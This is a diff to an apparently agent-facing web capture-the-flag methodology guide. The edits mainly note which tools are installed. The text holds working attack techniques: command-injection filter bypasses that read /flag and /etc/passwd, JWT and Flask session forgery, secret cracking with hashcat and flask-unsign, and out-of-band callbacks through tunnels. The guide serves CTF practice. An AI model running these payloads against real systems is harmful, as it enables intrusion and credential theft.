@@ -69,13 +69,16 @@ IDOR (increment/swap IDs & UUIDs; try all-zero `00000000-…`/default admin id) 
 
 ## Recon & OOB
 Script requests in `solver.py`, don't drive a GUI proxy.
+The image has `curl`, `ffuf`, `sqlmap`, `nmap`, `ctf-browser`, Python `httpx` and `flask-unsign`. It does not bundle a web wordlist. Build `tmp/paths.txt`/`tmp/params.txt` from the supplied routes, JavaScript and framework conventions before fuzzing; use a bigger list only when justified. The other named scanners, callback/tunnel clients, Playwright, Puppeteer and dalfox below are optional, so check availability first; `ctf-browser` is the installed browser path.
 ```bash
 curl -sSi https://TARGET/ | sed -n '1,25p'           # headers, cookies, server, framework tells
 curl -sS https://TARGET/robots.txt https://TARGET/sitemap.xml https://TARGET/.well-known/
-ffuf -u https://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 40
-ffuf -u 'https://TARGET/item?FUZZ=1' -w params.txt -fs 0     # param discovery via size filter
+printf '%s\n' admin api login static uploads backup > tmp/paths.txt # expand from observed routes
+ffuf -u https://TARGET/FUZZ -w tmp/paths.txt -mc 200,301,302,403 -t 40
+printf '%s\n' id user page file name token > tmp/params.txt # expand from observed client/source
+ffuf -u 'https://TARGET/item?FUZZ=1' -w tmp/params.txt -fs 0
 ```
-Reach for: **ffuf/feroxbuster/katana** (dir+param+crawl), **nuclei** (banner→CVE templates), **httpx** (fingerprint), **git-dumper** (`.git`), **PayloadsAllTheThings** (payload bank). Reusable client:
+Installed: **ffuf** (path/parameter probing), Python **httpx** (HTTP client). Optional extras: feroxbuster, katana, nuclei, the httpx CLI, git-dumper and PayloadsAllTheThings. A Python `httpx` import does not provide the `httpx` CLI. Reusable client:
 ```python
 import httpx
 c = httpx.Client(base_url="https://TARGET", timeout=10, follow_redirects=True)
@@ -85,7 +88,7 @@ r = c.post("/login", data={"user":"a","password":"a"}); print(r.status_code, dic
 ### Recon wins — the flag may already be exposed
 | Find | Move |
 |---|---|
-| Exposed `.git`/`.svn`/`.hg` | `git-dumper`, then `git log -p --all -S password`/`-S flag`; inspect reverted commits & stashes |
+| Exposed `.git`/`.svn`/`.hg` | obtain source with installed `curl`/`git` or optional `git-dumper`, then `git log -p --all -S password`/`-S flag`; inspect reverted commits & stashes |
 | Editor backups | `index.php~`, `.php.swp`/`.swo`, `.bak`, `config.php.save`, `.DS_Store` → source/secrets leak |
 | Custom headers | `curl -sSI` for `x-flag`/`x-secret`; `server`/`x-powered-by` banner → CVE match (nuclei) |
 | Robots/sitemap/bundled JS | hidden routes, admin paths, hardcoded API keys/endpoints, client-side secrets/HMAC keys |
@@ -93,7 +96,7 @@ r = c.post("/login", data={"user":"a","password":"a"}); print(r.status_code, dic
 | Paywall/hidden overlay | content is in raw HTML — `curl`/view-source bypasses the CSS overlay |
 
 ### OOB callback for blind bugs — give the target a URL, poll the hit
-No reflection ≠ no bug. Start `interactsh-client` (or webhook.site) → unique URL; inject it; poll. A **DNS** hit proves egress even when HTTP is filtered. To host a full exploit page the target/bot must reach, expose it with `cloudflared tunnel --url http://localhost:PORT` (fewer interstitials than ngrok).
+No reflection ≠ no bug. If an external callback is needed, use an available listener or optional `interactsh-client`/webhook.site; inject a unique URL and poll. A **DNS** hit proves egress even when HTTP is filtered. `cloudflared` is optional, not installed in the image; check availability before using it to expose a full exploit page.
 | Blind bug | Injection carrier |
 |---|---|
 | Blind SSRF | any URL/host field, webhook config, PDF/HTML/image renderer, `url=`/`callback=` param |
@@ -166,11 +169,11 @@ Blocked entities / no reflection → **external DTD**: host `<!ENTITY % f SYSTEM
 Space-blocked → `{cat,/flag}` (brace) or `cat${IFS}/flag`. `cat`/`head` blocked → `sed -n p flag`, `tac flag`, `awk '{print}'`, `nl flag`. Char-limited PHP → backticks `` `$_GET[0]`; `` move payload to URL. Filter only strips `;|&<>` → newline `%0a`. LaTeX PDF gen → `\input{|"cat /flag"}`, `\@@input"/etc/passwd"`.
 
 ### JWT & signed-session forgery
-Tools: `jwt_tool -M at` (probes all below), `hashcat -m 16500` (crack HS256), `flask-unsign` (Flask cookies).
+Installed: `flask-unsign` (Flask cookies), Python `jwt` for token inspection. `jwt_tool` and `hashcat` are optional; use them only after checking availability and preparing a candidate wordlist.
 | Weakness | Forge |
 |---|---|
 | `alg:none` accepted | header `{"alg":"none"}`, drop signature, set `admin`/`user` claim |
-| Weak HS256 secret | `hashcat -m 16500 jwt.txt rockyou.txt` → re-sign with cracked key |
+| Weak HS256 secret | If optional `hashcat` and a candidate list are available: `hashcat -m 16500 jwt.txt tmp/words.txt`; verify any recovered key before re-signing |
 | RS256→HS256 confusion | server verifies HS256 using the **public key** as the HMAC secret → sign token with the pubkey bytes as key |
 | `jku`/`x5u` header | point to a JWKS URL you host (OOB) → server fetches your signing key |
 | `kid` injection | SQLi / path traversal in `kid`; `kid`→`../../../dev/null` = empty key → HMAC with `""` |
@@ -178,7 +181,7 @@ Tools: `jwt_tool -M at` (probes all below), `hashcat -m 16500` (crack HS256), `f
 | key exposure | check `/api/getPublicKey`, `.env`, `/debug/config` |
 
 ```bash
-flask-unsign --unsign --cookie "$COOKIE" --wordlist rockyou.txt   # recover Flask SECRET_KEY
+flask-unsign --unsign --cookie "$COOKIE" --wordlist tmp/words.txt # prepare candidate list first
 flask-unsign --sign --cookie "{'user':'admin','admin':True}" --secret 'FOUND'
 ```
 
